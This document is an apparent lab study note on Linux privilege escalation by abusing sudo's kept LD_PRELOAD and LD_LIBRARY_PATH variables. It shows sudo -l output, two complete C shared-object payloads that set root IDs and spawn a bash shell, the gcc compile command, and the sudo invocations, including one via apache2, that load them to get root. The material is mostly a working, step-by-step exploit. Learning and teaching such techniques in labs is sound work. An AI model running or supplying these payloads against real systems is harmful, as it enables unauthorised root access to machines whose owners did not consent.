SUDO ENVIRONMENT VARIABLE
========================

A good discussion:
https://www.baeldung.com/linux/sudo-manage-environment-variables
NOTES:

1. To check which environment variables are inherited?

sudo -l

Got Result:
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more


2. We have a C code for creating
*******************


#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}


3.Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD 
environment variable to the full path of the new shared object:

Syntax:
sudo LD_PRELOAD=/tmp/preload.so program-name-here

4.A root shell should spawn. Exit out of the shell before continuing. 

5. Now actual exploit using apache2

6.Check which shared library are used by apache2 program
ldd /usr/sbin/apache2

linux-vdso.so.1 =>  (0x00007ffff5fce000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fbafc91a000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007fbafc6f6000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007fbafc4bc000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007fbafc2a0000)
        libc.so.6 => /lib/libc.so.6 (0x00007fbafbf34000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007fbafbd2f000)
        librt.so.1 => /lib/librt.so.1 (0x00007fbafbb27000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007fbafb8f0000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007fbafb6eb000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007fbafb4c3000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fbafcdd7000)

7. Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:


#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}


********************
8. compile it
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

9. Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
sudo LD_LIBRARY_PATH=/tmp apache2

